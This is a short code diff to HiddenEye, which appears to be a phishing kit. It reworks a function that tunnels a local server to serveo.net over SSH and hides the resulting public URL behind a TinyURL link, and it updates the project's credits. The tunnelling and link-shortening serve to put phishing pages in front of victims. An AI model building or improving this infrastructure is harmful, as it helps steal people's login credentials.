@@ -99,18 +99,25 @@ def runNgrok():
 def runServeo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
     sleep(7)
-    with open('link.url') as creds:
-        lines = creds.read().rstrip()
-        if len(lines) != 0:
-            pass
-        else:
-            runServeo()
-    output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
-    url = str(output).strip("b ' \ n")
-    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
-    link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
-    print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
-    print("\n")
+    try:
+        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url",shell=True)    
+        url = str(output).strip("b ' \ n")
+        print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
+        print("\n") 
+        data = urlopen("http://tinyurl.com/api-create.php?url="+url)
+        url = data.read()
+        link = url.decode('utf-8')
+        print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
+        print("\n")  
+    except subprocess.CalledProcessError:
+        print ('''
+  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
+      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
+      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
+          \|
+                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
+'''.format(RED, DEFAULT))
+        exit(0)
 
 def runMainMenu(): #menu where user select what they wanna use
     system('clear')
@@ -266,7 +273,7 @@ def endMessage(): #Message when HiddenEye exit
 
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
          {0}THANKS FOR USING IT. HELP US TO MAKE IT MORE USEFUL
-              {3}https://github.com/DarkSecDevelopers     '''.format(GREEN, DEFAULT, CYAN, RED))
+              {3}https://github.com/DarkSecDevelopers/HiddenEye     '''.format(GREEN, DEFAULT, CYAN, RED))
 
 def getCredentials():
 
